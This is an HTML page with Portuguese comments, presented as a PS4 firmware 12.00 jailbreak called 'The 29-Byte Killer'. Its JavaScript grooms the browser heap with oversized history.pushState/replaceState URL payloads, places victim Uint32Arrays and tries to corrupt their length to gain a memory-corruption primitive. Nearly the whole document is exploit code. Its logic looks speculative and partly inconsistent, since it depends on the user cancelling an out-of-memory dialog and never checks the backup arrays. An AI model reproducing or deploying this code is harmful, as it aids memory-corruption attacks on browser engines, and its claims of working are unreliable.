<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <title>PS4 12.00 JAILBREAK (The 29-Byte Killer)</title>
    <style>
        body { background-color: #000; color: #00ff00; font-family: monospace; padding: 20px; }
        #log { border: 1px solid #333; padding: 10px; height: 500px; overflow-y: scroll; white-space: pre-wrap; font-size: 14px;}
        .btn { 
            padding: 20px; font-size: 1.3em; cursor: pointer; 
            background: #111; color: #fff; border: 2px solid #0f0; margin: 10px 0; width: 100%; font-weight: bold;
        }
        .btn:hover { background: #222; }
        .win { background-color: #004400; color: #fff; border: 1px solid #0f0; padding: 5px; }
    </style>
</head>
<body>

<h1>THE 29-BYTE KILLER</h1>
<p>Alvo: Corromper Vítima usando range 0x00-0x1C.</p>

<button class="btn" onclick="runPhase1()">1. PREPARAR (Teste 6 Original)</button>
<button class="btn" onclick="runPhase2()">2. ALINHAR (Teste 3 Original)</button>
<button class="btn" onclick="runPhase3()" style="border-color: red; color: red;">3. DISPARAR (Deploy Victim & Attack)</button>

<div id="log">Aguardando...</div>

<script>
    const BASE_OFFSET = 709522; 
    var victim = null; // Nossa vítima global

    function log(msg, type='') {
        const el = document.getElementById('log');
        const color = type === 'win' ? '#ffff00' : '#00ff00';
        el.innerHTML += `<div style="color:${color}">[${new Date().toLocaleTimeString()}] ${msg}</div>`;
        el.scrollTop = el.scrollHeight;
    }

    async function wait(ms) { return new Promise(r => setTimeout(r, ms)); }

    // ======================================================
    // FASE 1: GROOMING (INTOCADO)
    // ======================================================
    async function runPhase1() {
        log("=== FASE 1: GROOMING (TESTE 6) ===");
        // Parâmetros originais que você confirmou
        const start = 1000; 
        const step = 5000; 
        const max = 46000; 

        try {
            for(let size = start; size <= max; size += step) {
                let overflow = "";
                for (let j = 0; j < size; j++) overflow += String.fromCharCode(j % 33);
                
                const payload = "/" + "A".repeat(BASE_OFFSET) + overflow;
                history.pushState({}, `inc_${size}`, payload);
                
                if(size % 10000 === 0) {
                    log(`[Prep] Alocado: ${size} bytes`);
                    await wait(50);
                }
            }
        } catch(e) { log(`[!] Erro Fase 1: ${e.message}`); }
        log("Fase 1 OK.");
    }

    // ======================================================
    // FASE 2: PADRÕES (INTOCADO)
    // ======================================================
    async function runPhase2() {
        log("=== FASE 2: ALINHAMENTO (TESTE 3) ===");
        const sequences = [
            "\x00\x00\x00\x00", "\x0A\x0A\x0A\x0A", "\x09\x09\x09\x09", 
            "\x0D\x0D\x0D\x0D", "\x20\x20\x20\x20", "\x00\x09\x0A\x0D\x20"
        ];

        try {
            for (let seq of sequences) {
                let overflow = "";
                for (let i = 0; i < 1000; i++) overflow += seq;
                
                const payload = "/" + "A".repeat(BASE_OFFSET) + overflow;
                history.pushState({}, "pattern", payload);
                await wait(50);
            }
        } catch(e) {}
        log("Fase 2 OK.");
    }

    // ======================================================
    // FASE 3: O ATAQUE COM VÍTIMA
    // ======================================================
    async function runPhase3() {
        log("=== FASE 3: INJEÇÃO E GATILHO ===", 'win');
        
        // 1. CRIAR A VÍTIMA
        // Colocamos ela AGORA, depois de tudo estar alinhado e antes do caos.
        log("Posicionando Array Vítima...");
        
        // Criamos um array de inteiros. O objetivo é mudar o tamanho dele.
        // Tamanho 0x100 (256 elementos)
        victim = new Uint32Array(256);
        victim.fill(0x13371337); // Marcador para confirmar leitura
        
        // Cria mais algumas para garantir que uma esteja no lugar certo
        var victims_backup = [];
        for(let i=0; i<10; i++) {
            let v = new Uint32Array(256);
            v.fill(0x41414141);
            victims_backup.push(v);
        }

        log("Vítima posicionada. Iniciando Loop de Pressão...", 'win');
        log("!!! QUANDO A JANELA DE MEMÓRIA APARECER: CLIQUE EM CANCELAR !!!", 'win');

        await wait(1000);

        // 2. DISPARAR O TESTE 1 (Byte Map Loop)
        // Isso vai causar o OOM (Falta de Memória)
        try {
            // Loop agressivo para causar o alerta
            for(let loop=0; loop<50; loop++) {
                // Tenta alocar buffers grandes e empurrar no histórico
                // Usamos o padrão 0x00-0x1C (que sabemos que funciona) para o ataque
                
                // O PAYLOAD DE ATAQUE (29 BYTES)
                // Se a janela aparecer e cancelarmos, este payload será escrito
                let attackBytes = "\x00".repeat(29); 
                let payload = "/" + "A".repeat(BASE_OFFSET) + attackBytes;
                
                try {
                    // ReplaceState é melhor aqui para tentar sobrescrever a vítima vizinha
                    // Mas pushState causa mais pressão. Vamos alternar.
                    if(loop % 2 === 0) history.pushState({}, `pressure_${loop}`, payload);
                    else history.replaceState({}, `pressure_${loop}`, payload);
                    
                } catch(e) {
                    // Se der erro, checamos se funcionou
                    if(checkSuccess()) return;
                }
                
                // Checagem constante
                if(loop % 10 === 0) {
                     if(checkSuccess()) return;
                     log(`Pressão... Nível ${loop}`);
                     await wait(10);
                }
            }
        } catch(e) {
            log("Erro fatal no loop: " + e.message);
        }
    }

    function checkSuccess() {
        // Verifica a vítima principal
        if (victim.length !== 256) {
            exploit_success(victim);
            return true;
        }
        // Verifica os backups
        // (Apenas se a variável global victims_backup estiver acessível, 
        // mas focaremos na principal por simplicidade)
        return false;
    }

    function exploit_success(corrupted_arr) {
        document.body.style.backgroundColor = "#004400";
        log("!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!", 'win');
        log("!!! JACKPOT !!!", 'win');
        log("TAMANHO DA VÍTIMA CORROMPIDO: " + corrupted_arr.length, 'win');
        log("!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!", 'win');
        alert("JAILBREAK PRIMITIVE FOUND!\nLength: " + corrupted_arr.length);
    }

</script>
</body>
</html>
